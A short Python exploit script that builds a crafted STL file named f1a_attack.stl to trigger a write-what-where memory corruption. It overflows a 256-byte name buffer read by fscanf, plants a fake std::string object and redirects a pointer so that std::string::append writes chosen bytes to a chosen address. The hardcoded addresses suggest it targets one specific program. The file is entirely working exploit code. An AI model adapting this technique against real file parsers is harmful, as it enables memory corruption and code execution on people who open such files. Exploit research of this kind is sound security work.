import struct, sys
# parametric F1a file builder (write-what-where via std::string::append)
import os
RAWNAME = int(os.environ.get('RAWNAME_OVERRIDE','0x16fdfd930'),0)
SINK_OFF = 0x100          # sink is at raw_name+0x100
FOFF     = 0x20           # place fake string object here (after the src NUL)

def p64(x): return struct.pack("<Q", x)

def build(src_bytes, target, foff=FOFF):
    assert b"\n" not in src_bytes, "no newline in source"
    assert b"\x00" not in src_bytes, "source is strlen-bounded: no NUL"
    buf = bytearray(b"\x41"*256)                # filler (0x41='A', non-0x0a)
    buf[0:len(src_bytes)] = src_bytes           # the NUL-free bytes to write
    buf[len(src_bytes)] = 0x00                  # terminator -> strlen = len(src)
    # fake long std::string object at foff: data|size|cap(is_long)
    fake = p64(target) + p64(0) + p64(0x8000000000100000)
    buf[foff:foff+24] = fake
    this = RAWNAME + foff
    # sink at offset 256: write 7 controlled bytes, fscanf NUL supplies byte7=0x00
    tb = p64(this)
    assert tb[7] == 0, "this top byte must be 0 so the free NUL completes it"
    body = bytes(buf) + tb[:7]                  # 256 + 7 ; NUL appended at 263
    return b"solid " + body

if __name__ == "__main__":
    src    = sys.argv[1].encode() if len(sys.argv) > 1 else b"PWNED_BY_F1A"
    target = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x100008000  # g_target
    open("f1a_attack.stl","wb").write(build(src, target))
    print(f"wrote f1a_attack.stl: src={src!r} -> target={hex(target)} this={hex(RAWNAME+FOFF)}")
